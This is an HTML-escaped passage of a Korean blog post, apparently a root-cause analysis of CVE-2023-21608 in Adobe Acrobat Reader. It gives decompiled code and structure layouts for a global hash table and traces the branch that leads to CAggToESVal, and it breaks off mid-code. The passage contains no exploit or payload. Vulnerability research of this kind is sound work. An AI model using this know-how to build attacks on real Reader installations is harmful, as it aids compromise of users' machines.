&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;HashBucketEnd   dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;HashBucketUnknown dd ?                  
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C BucketMaxIndex  dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000010 &lt;/span&gt;BucketCount     dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000014 &lt;/span&gt;HashBucketTable ends
&lt;span class=&#34;hljs-number&#34;&gt;00000014&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketEntryHeader struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_228)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;BucketHead      dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;BucketTail      dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;HashBucketEntryHeader ends
&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;union1          union ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_229)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;list_entry      ListEntry ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;entry_header    HashBucketEntryHeader ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;union1          ends
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;HashTable&lt;/code&gt;&amp;#xC740; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14; &amp;#xAD6C;&amp;#xD604;&amp;#xC744; &amp;#xC704;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB85C; &lt;code&gt;HashTable.DefaultHead&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC2DC;&amp;#xC791;&amp;#xB418;&amp;#xB294; &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB294; &lt;code&gt;HashBucketEntry&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC838; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &amp;#xC6D0;&amp;#xD615; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; &amp;#xC5F0;&amp;#xC18D;&amp;#xC801;&amp;#xC778; &amp;#xC77C;&amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xB418;&amp;#xC5B4; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xC774;&amp;#xB8E8;&amp;#xB294; &amp;#xBC84;&amp;#xD0B7;&amp;#xB4E4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB294; &lt;code&gt;HashBucketTable&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC778; &lt;code&gt;HashTable.HashBuckets&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xACE0; &lt;code&gt;HashBucketTable.HashBucketBegin&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;HashBucketTable.HashBucketEnd&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;HashBucketTable.BucketCount&lt;/code&gt; &amp;#xAE38;&amp;#xC774;&amp;#xC758; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt; &amp;#xBC30;&amp;#xC5F4;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xB97C; &amp;#xADF8;&amp;#xB9BC;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HashBucketEntryHeader&lt;/code&gt; &amp;#xBC30;&amp;#xC5F4;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD2B9;&amp;#xC815; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xC5F0;&amp;#xC18D;&amp;#xB41C; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC744; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; Head&amp;#xC640; Tail &amp;#xB178;&amp;#xB4DC;&amp;#xB97C; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC774; &amp;#xBAA8;&amp;#xB450; &lt;code&gt;HashTable.DefaultHead&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xC815;&amp;#xB9D0; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC774; &amp;#xC7AC;&amp;#xBBF8;&amp;#xC788;&amp;#xB294; &amp;#xC21C;&amp;#xAC04;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC;&amp;#x2026; &amp;#xC790;&amp;#xC8FC; &amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C4; &amp;#xC54A;&amp;#xAD70;&amp;#xC694;&amp;#x2026; &lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xD2BC; &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xB97C; &amp;#xAC16;&amp;#xB294; &lt;code&gt;HashTable&lt;/code&gt;&amp;#xC744; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;sub-20AD638B&#34;&gt;&lt;a href=&#34;#sub-20AD638B&#34; class=&#34;headerlink&#34; title=&#34;sub_20AD638B&#34;&gt;&lt;/a&gt;sub_20AD638B&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;sub_20AD638B&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *a2, _DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntry *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  ListEntry returnPtr; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+4h] [ebp-8h] BYREF&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  v5 = FindDataFromHashTable(hashTable, &amp;amp;returnPtr, pData, DataHash)-&amp;gt;Blink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v5 )
    v5 = hashTable-&amp;gt;DefaultHead;
  result = a2;
  a2-&amp;gt;Flink = v5;                              
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;pData&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xD574;&amp;#xC2F1;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;hashFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a1, _BYTE *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; len)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; len; ++i )
    a1 = &lt;span class=&#34;hljs-number&#34;&gt;0x1000193&lt;/span&gt; * (a1 ^ (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)a2[i]);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a1;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xD55C; &lt;code&gt;DataHash&lt;/code&gt;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;FindDataFromHashTable&#34;&gt;&lt;a href=&#34;#FindDataFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;FindDataFromHashTable&#34;&gt;&lt;/a&gt;FindDataFromHashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;FindDataFromHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *returnPtr, _DWORD *pData, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntryHeader *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  HashBucketEntry *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  HashBucketEntry *v7; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  idx = DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex;&lt;span class=&#34;hljs-comment&#34;&gt;// Hash &amp;amp; 7&lt;/span&gt;
  v5 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;  
  v6 = hashTable-&amp;gt;DefaultHead;                  &lt;span class=&#34;hljs-comment&#34;&gt;// default header&lt;/span&gt;
  v7 = v5[idx].BucketTail;                     
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 == v6 )                               &lt;span class=&#34;hljs-comment&#34;&gt;// bucket is empty&lt;/span&gt;
  {
    result = returnPtr;
    returnPtr-&amp;gt;Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
LABEL_8:
    result-&amp;gt;Flink = v6;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; )                                 &lt;span class=&#34;hljs-comment&#34;&gt;// Traverse Bucket(doubly linked list)&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// from Tail to Head&lt;/span&gt;
    {
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *pData == v7-&amp;gt;Data )                 &lt;span class=&#34;hljs-comment&#34;&gt;// Data Found&lt;/span&gt;
      {
        result = returnPtr;
        v6 = v7-&amp;gt;list_entry.list_entry.Flink;
        returnPtr-&amp;gt;Blink = v7;                  &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Filnk = found-&amp;gt;Flink&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Blink = found&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_8;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 == v5[idx].BucketHead )
        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
      v7 = v7-&amp;gt;list_entry.list_entry.Blink;
    }
    result = returnPtr;
    returnPtr-&amp;gt;Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    returnPtr-&amp;gt;Flink = v7;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;                                &lt;span class=&#34;hljs-comment&#34;&gt;// Data not found&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Flink = BucketHead&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Blink = NULL;&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;DataHash&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD560; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0D0;&amp;#xC0C9;&amp;#xC740; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xB530;&amp;#xB77C; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC5D0; &amp;#xB3C4;&amp;#xB2EC;&amp;#xD560; &amp;#xB54C;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &amp;#xB9CC;&amp;#xC57D; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC774; &lt;code&gt;DefaultHead&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xD0B7;&amp;#xC740; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xAE30;&amp;#xC5D0; &amp;#xD0D0;&amp;#xC0C9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;&amp;#xBA74; &amp;#xD0D0;&amp;#xC0C9; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;returnPtr&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xB098; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;, &lt;code&gt;returnPtr-&amp;gt;Flink&lt;/code&gt;&amp;#xC640; &lt;code&gt;returnPtr-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xCC3E;&amp;#xC740; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &lt;code&gt;Flink&lt;/code&gt;&amp;#xC640; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;returnPtr-&amp;gt;Flink&lt;/code&gt;&amp;#xC640; &lt;code&gt;returnPtr-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xBC18;&amp;#xD658;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;FindDataFromHashTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD0D0;&amp;#xC0C9; &amp;#xACB0;&amp;#xACFC;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xB41C; &lt;code&gt;returnPtr&lt;/code&gt;&amp;#xC758; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; &amp;#xC774; &amp;#xAC12;&amp;#xC774; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC778;(HashTable&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;) &amp;#xACBD;&amp;#xC6B0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a2&lt;/code&gt;&amp;#xC758; &lt;code&gt;Flink&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;hashTable-&amp;gt;DefaultHead&lt;/code&gt;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;v5 = FindDataFromHashTable(hashTable, &amp;amp;returnPtr, pData, DataHash)-&amp;gt;Blink;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v5 )
  v5 = hashTable-&amp;gt;DefaultHead;
result = a2;
a2-&amp;gt;Flink = v5;                              
&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB098; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xB294; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xB97C; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xC640; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Data &amp;amp;&amp;amp; sub_20AD638B(&amp;amp;GlobalHashTable, (ListEntry *)&amp;amp;a2, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink != GlobalHashTable.DefaultHead;
&lt;span class=&#34;hljs-comment&#34;&gt;//if Data is in GlobalHashTable, then Node&amp;apos;s Addr != GlobalHashTable.&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//=&amp;gt; return true&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//else return false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC774; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB9CC; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
{
  LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
  {
    v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
